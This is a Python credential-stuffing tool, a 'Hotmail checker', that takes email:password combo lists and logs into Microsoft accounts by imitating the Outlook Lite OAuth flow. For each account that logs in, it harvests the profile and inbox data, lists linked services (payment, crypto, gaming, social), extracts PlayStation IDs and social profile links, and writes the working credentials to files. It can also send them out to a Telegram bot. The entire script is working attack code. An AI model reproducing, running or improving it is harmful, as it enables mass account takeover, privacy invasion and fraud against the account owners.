import requests
import json
import threading
import time
import os
import re
import uuid
import urllib.parse
import sys
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor


RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m'


stats = {'total': 0, 'valid': 0, 'invalid': 0}
stats_lock = threading.Lock()


SERVICE_DB = {
    
    "Facebook": ["facebookmail.com", "facebook.com"],
    "Instagram": ["mail.instagram.com", "instagram.com"],
    "TikTok": ["account.tiktok.com", "tiktok.com"],
    "Twitter/X": ["x.com", "twitter.com"],
    "LinkedIn": ["linkedin.com"],
    "Snapchat": ["snapchat.com"],
    "Discord": ["discord.com"],
    "Telegram": ["telegram.org"],
    "WhatsApp": ["whatsapp.com"],
    "Pinterest": ["pinterest.com"],
    "Reddit": ["reddit.com"],
    "YouTube": ["youtube.com"],
    "Twitch": ["twitch.tv"],
    

    "Steam": ["steampowered.com", "steam.com"],
    "Xbox": ["xbox.com"],
    "PlayStation": ["playstation.com", "sony.com"],
    "Nintendo": ["nintendo.net", "nintendo.com"],
    "Epic Games": ["epicgames.com"],
    "EA Sports": ["ea.com"],
    "Ubisoft": ["ubisoft.com"],
    "Activision": ["activision.com"],
    "Blizzard": ["blizzard.com"],
    "Riot Games": ["riotgames.com"],
    "Roblox": ["roblox.com"],
    "Minecraft": ["mojang.com", "minecraft.net"],
    "Fortnite": ["epicgames.com"],
    "Valorant": ["riotgames.com"],
    "League of Legends": ["leagueoflegends.com"],
    "Call of Duty": ["callofduty.com"],
    "PUBG": ["pubg.com", "pubgmobile.com"],
    "Genshin Impact": ["hoyoverse.com", "genshinimpact.com"],
    "FIFA": ["ea.com"],
    
  
    "Netflix": ["account.netflix.com", "netflix.com"],
    "Spotify": ["spotify.com"],
    "Disney+": ["disneyplus.com"],
    "HBO Max": ["hbomax.com"],
    "Amazon Prime": ["primevideo.com"],
    "YouTube Premium": ["youtube.com"],
    "Apple Music": ["apple.com"],
    "Hulu": ["hulu.com"],
    "Crunchyroll": ["crunchyroll.com"],
    
  
    "Amazon": ["amazon.com"],
    "eBay": ["ebay.com"],
    "AliExpress": ["aliexpress.com"],
    "Walmart": ["walmart.com"],
    "Target": ["target.com"],
    "Nike": ["nike.com"],
    "Adidas": ["adidas.com"],
    "Etsy": ["etsy.com"],
    
  
    "PayPal": ["paypal.com"],
    "Venmo": ["venmo.com"],
    "Cash App": ["cash.app"],
    "Stripe": ["stripe.com"],
    "Binance": ["binance.com"],
    "Coinbase": ["coinbase.com"],
    "Revolut": ["revolut.com"],
   
    "ChatGPT": ["openai.com"],
    "Claude AI": ["anthropic.com"],
    "Google Gemini": ["google.com"],
    "Microsoft Copilot": ["microsoft.com"],
    "Midjourney": ["midjourney.com"],
}

def get_ua():
   
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

def authenticate(email, password):
 
    try:
     
        params = {
            "client_info": "1",
            "haschrome": "1",
            "login_hint": email,
            "mkt": "en",
            "response_type": "code",
            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
            "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"
        }
        
        url = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?{urllib.parse.urlencode(params)}"
        
        headers = {
            "User-Agent": get_ua(),
            "X-Requested-With": "com.microsoft.outlooklite"
        }
        
        r = requests.get(url, headers=headers, timeout=15)
        cookies = r.cookies.get_dict()
        
       
        ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)\\"', r.text)
        post_match = re.search(r'"urlPost":"([^"]+)"', r.text)
        
        if not ppft_match or not post_match:
            return None, None
        
        
        payload = {
            "i13": "1",
            "login": email,
            "loginfmt": email,
            "type": "11",
            "LoginOptions": "1",
            "passwd": password,
            "PPFT": ppft_match.group(1),
            "PPSX": "PassportR",
            "i19": "9960"
        }
        
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        headers['Referer'] = r.url
        headers['Cookie'] = '; '.join([f"{k}={v}" for k, v in cookies.items()])
        
        login_r = requests.post(
            post_match.group(1).replace('\\/', '/'),
            data=payload,
            headers=headers,
            allow_redirects=False,
            timeout=15
        )
        
        login_cookies = login_r.cookies.get_dict()
        
     
        if not any(k in login_cookies for k in ["JSH", "JSHP", "ANON", "WLSSC"]):
            return None, None
        
       
        location = login_r.headers.get('Location', '')
        if 'code=' not in location:
            return None, None
        
        code = location.split('code=')[1].split('&')[0]
        cid = login_cookies.get('MSPCID', '').upper()
        
        
        token_url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
        token_data = {
            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
            "grant_type": "authorization_code",
            "code": code,
            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
        }
        
        token_r = requests.post(token_url, data=token_data, timeout=10)
        token = token_r.json().get("access_token")
        
        return token, cid
        
    except:
        return None, None

def get_profile(token, cid):
  
    try:
        headers = {
            "Authorization": f"Bearer {token}",
            "User-Agent": "Outlook-Android/2.0",
            "X-AnchorMailbox": f"CID:{cid}",
            "Accept": "application/json"
        }
        
        url = "https://substrate.office.com/profileb2/v2.0/me/V1Profile"
        r = requests.get(url, headers=headers, timeout=10)
        
        if r.status_code != 200:
            return {'name': 'Unknown', 'country': 'Unknown', 'birth_date': 'Unknown'}
        
        data = r.json()
        
       
        name = "Unknown"
        if 'names' in data and data['names']:
            name = data['names'][0].get('displayName', 'Unknown')
        elif 'displayName' in data:
            name = data['displayName']
        elif 'givenName' in data and 'surname' in data:
            name = f"{data['givenName']} {data['surname']}"
        
    
        country = "Unknown"
        if 'accounts' in data and data['accounts']:
            country = data['accounts'][0].get('location', 'Unknown')
        elif 'country' in data:
            country = data['country']
        
  
        birth_date = "Unknown"
        day = str(data.get('birthDay', ''))
        month = str(data.get('birthMonth', ''))
        year = str(data.get('birthYear', ''))
        
        if day and month and year:
            birth_date = f"{day.zfill(2)}/{month.zfill(2)}/{year}"
        
        return {'name': name, 'country': country, 'birth_date': birth_date}
        
    except:
        return {'name': 'Unknown', 'country': 'Unknown', 'birth_date': 'Unknown'}

def scan_inbox(email, token, cid):

    try:
        url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
        
        headers = {
            "x-owa-sessionid": f"{cid}",
            "authorization": f"Bearer {token}",
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N)",
            "action": "StartupData",
            "origin": "https://outlook.live.com",
            "x-requested-with": "com.microsoft.outlooklite",
        }
        
        r = requests.post(url, headers=headers, data="", timeout=15)
        
        if r.status_code != 200:
            return None
        
        return r.text.lower()
        
    except:
        return None

def detect_services(inbox_content):

    if not inbox_content:
        return []
    
    found = []
    
    for service, domains in SERVICE_DB.items():
        for domain in domains:
            domain_lower = domain.lower()
            
   
            if domain_lower in inbox_content:
  
                if (f"@{domain_lower}" in inbox_content or
                    f"noreply@{domain_lower}" in inbox_content or
                    f"no-reply@{domain_lower}" in inbox_content or
                    f"{domain_lower}/" in inbox_content or
                    f"www.{domain_lower}" in inbox_content):
                    
                    if service not in found:
                        found.append(service)
                    break
    
    return found

def scan_psn(email, token, cid):
   
    try:
        search_url = "https://outlook.live.com/search/api/v2/query"
        
        headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{cid}"
        }
        
        payload = {
            "Cvid": str(uuid.uuid4()),
            "EntityRequests": [{
                "EntityType": "Conversation",
                "ContentSources": ["Exchange"],
                "Query": {"QueryString": "sony@txn-email.playstation.com"},
                "Size": 50
            }]
        }
        
        r = requests.post(search_url, json=payload, headers=headers, timeout=15)
        
        if r.status_code != 200:
            return {'has_psn': False, 'online_ids': [], 'email_count': 0}
        
        result = r.json()
        result_text = json.dumps(result)
        
       
        email_count = result_text.lower().count("sony@txn-email.playstation.com")
        
        if email_count == 0:
            return {'has_psn': False, 'online_ids': [], 'email_count': 0}
        
    
        online_ids = []
        patterns = [
            r'Online ID:\s*([a-zA-Z0-9_-]{3,16})',
            r'PSN ID:\s*([a-zA-Z0-9_-]{3,16})',
            r'Sign-In ID:\s*([a-zA-Z0-9_-]{3,16})'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, result_text, re.IGNORECASE)
            for match in matches:
                if match not in online_ids:
                    online_ids.append(match)
        
        return {
            'has_psn': True,
            'online_ids': online_ids,
            'email_count': email_count
        }
        
    except:
        return {'has_psn': False, 'online_ids': [], 'email_count': 0}

def extract_social_links(inbox_content):

    if not inbox_content:
        return {}
    
    links = {}
    
    patterns = {
        'Instagram': r'instagram\.com/([a-zA-Z0-9_.]{3,30})',
        'TikTok': r'tiktok\.com/@([a-zA-Z0-9_.]{3,30})',
        'Facebook': r'facebook\.com/([a-zA-Z0-9.]{3,50})',
        'Twitter': r'twitter\.com/([a-zA-Z0-9_]{3,30})'
    }
    
    for platform, pattern in patterns.items():
        matches = re.findall(pattern, inbox_content, re.IGNORECASE)
        for match in matches:
            if not any(x in match.lower() for x in ['support', 'help', 'noreply', 'email']):
                if platform not in links:
                    links[platform] = []
                link = f"https://www.{platform.lower()}.com/{match}"
                if link not in links[platform]:
                    links[platform].append(link)
    
    return links

def save_result(email, password, profile, services, psn_data, social_links):
  
    Path('results').mkdir(exist_ok=True)
    
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
 
    capture = []
    
    capture.append("@baron_saplar")
    
    capture.append(f"\n📧 EMAIL: {email}")
    capture.append(f"🔑 PASSWORD: {password}")
    capture.append(f"⏰ CAPTURED: {timestamp}\n")
    
   
   
    capture.append(" PROFILE")
    
    capture.append(f"Name: {profile['name']}")
    capture.append(f"Country: {profile['country']}")
    capture.append(f"Birth Date: {profile['birth_date']}\n")
    
    
    if services:
        
        capture.append(f" DETECTED SERVICES ({len(services)})")
        
        for service in sorted(services):
            capture.append(f"✓ {service}")
        capture.append("")
    
   
    if psn_data['has_psn']:
        
        capture.append("🎮 PLAYSTATION NETWORK")
        
        capture.append(f"PSN Emails: {psn_data['email_count']}")
        if psn_data['online_ids']:
            capture.append(f"Online IDs: {', '.join(psn_data['online_ids'])}")
        capture.append("")
    
    # Social Links
    if social_links:
        
        capture.append("🔗 SOCIAL MEDIA PROFILES")
       
        for platform, links in social_links.items():
            capture.append(f"\n{platform}:")
            for link in links[:3]:
                capture.append(f"  • {link}")
        capture.append("")
    
    
    
    # Save to single file
    with open('results/full_capture.txt', 'a', encoding='utf-8') as f:
        f.write('\n'.join(capture))
    
    
    with open('results/hits.txt', 'a', encoding='utf-8') as f:
        f.write(f"{email}:{password} | {profile['name']} | {timestamp}\n")

def send_telegram(token, chat_id, email, password, profile, services, psn_data):
   
    try:
        msg = f"<b> HOTMAIL HIT - FULL CAPTURE</b>\n\n"
        msg += f"📧 <code>{email}</code>\n"
        msg += f"🔑 <code>{password}</code>\n\n"
        msg += f"👤 {profile['name']} | {profile['country']}\n"
        msg += f"🎂 {profile['birth_date']}\n\n"
        
        if services:
            msg += f"<b>🎯 Services ({len(services)}):</b>\n"
            for service in services[:15]:
                msg += f"✓ {service}\n"
            if len(services) > 15:
                msg += f"... +{len(services)-15} more\n"
            msg += "\n"
        
        if psn_data['has_psn']:
            msg += f"<b>🎮 PlayStation:</b>\n"
            msg += f"Emails: {psn_data['email_count']}\n"
            if psn_data['online_ids']:
                msg += f"IDs: {', '.join(psn_data['online_ids'][:3])}\n"
        
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        requests.post(url, data={
            'chat_id': chat_id,
            'text': msg[:4000],
            'parse_mode': 'HTML',
            'disable_web_page_preview': True
        }, timeout=5)
        
    except:
        pass

def scan_account(email, password, telegram_token, telegram_chat):
   
    global stats
    
    try:
       
        token, cid = authenticate(email, password)
        
        with stats_lock:
            stats['total'] += 1
        
        if not token:
            with stats_lock:
                stats['invalid'] += 1
            print(f"{RED}[-] {stats['total']:<6} Invalid: {email}{RESET}")
            return
        
        with stats_lock:
            stats['valid'] += 1
        
        print(f"{GREEN}[+] {stats['total']:<6} Valid: {email}{RESET}")
        
        
        profile = get_profile(token, cid)
        
        
    
        inbox_content = scan_inbox(email, token, cid)
        
        if not inbox_content:
      
            return
        
       
        services = detect_services(inbox_content)
        
        
        
            
        
       
        psn_data = {'has_psn': False, 'online_ids': [], 'email_count': 0}
        if 'PlayStation' in services:
            print(f"{CYAN}    Scanning PSN...{RESET}")
            psn_data = scan_psn(email, token, cid)
            if psn_data['has_psn']:
                print(f"{BLUE}    → PSN: {psn_data['email_count']} emails{RESET}")
        
        
        social_links = extract_social_links(inbox_content)
        if social_links:
            print(f"{CYAN}    → Social: {', '.join(social_links.keys())}{RESET}")
        
       
        save_result(email, password, profile, services, psn_data, social_links)
        
        
        
        if telegram_token and telegram_chat and (services or psn_data['has_psn']):
            send_telegram(telegram_token, telegram_chat, email, password, profile, services, psn_data)
            
        
        print()
        
    except Exception as e:
        pass

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print(f"{CYAN}")
   
    print("   HOTMAIL  CHECKER - FULL CAPTURE  ")

    print(f"{RESET}\n")
    
    try:
       
        combo_file = input(f"{YELLOW}[+] Combo file: {RESET}").strip()
        
        if not combo_file or not os.path.exists(combo_file):
            print(f"{RED}[!] File not found!{RESET}")
            
            return
        
        telegram_token = input(f"{YELLOW}[+] Telegram token (optional): {RESET}").strip()
        telegram_chat = input(f"{YELLOW}[+] Telegram chat ID (optional): {RESET}").strip()
        
        threads_input = input(f"{YELLOW}[+] Threads [10]: {RESET}").strip()
        threads = int(threads_input) if threads_input.isdigit() else 10
        
       
        with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
            combos = [line.strip() for line in f if ':' in line]
        
        if not combos:
            print(f"{RED}[!] No valid combos!{RESET}")
            
            return
        
        print(f"\n{CYAN}{'='*80}{RESET}")
        print(f"{YELLOW}[*] Loaded: {len(combos)} accounts{RESET}")
        print(f"{YELLOW}[*] Threads: {threads}{RESET}")
        print(f"{CYAN}{'='*80}{RESET}\n")
        
        start_time = time.time()
        
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for combo in combos:
                if ':' not in combo:
                    continue
                
                email, password = combo.split(':', 1)
                executor.submit(
                    scan_account,
                    email.strip(),
                    password.strip(),
                    telegram_token if telegram_token else None,
                    telegram_chat if telegram_chat else None
                )
        
        elapsed = time.time() - start_time
        
        
        print(f"\n{CYAN}{'='*80}{RESET}")
        print(f"{GREEN}✓ Valid:   {stats['valid']}{RESET}")
        print(f"{RED}✗ Invalid: {stats['invalid']}{RESET}")
        print(f"{WHITE}⏱ Time:    {elapsed:.2f}s{RESET}")
        print(f"{CYAN}{'='*80}{RESET}\n")
        print(f"{YELLOW}📁 Results saved in: results/full_capture.txt{RESET}\n")
        
        input(f"{GREEN}Press Enter to exit...{RESET}")
        
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Interrupted{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")
        input("\nPress Enter...")

if __name__ == "__main__":
    main()
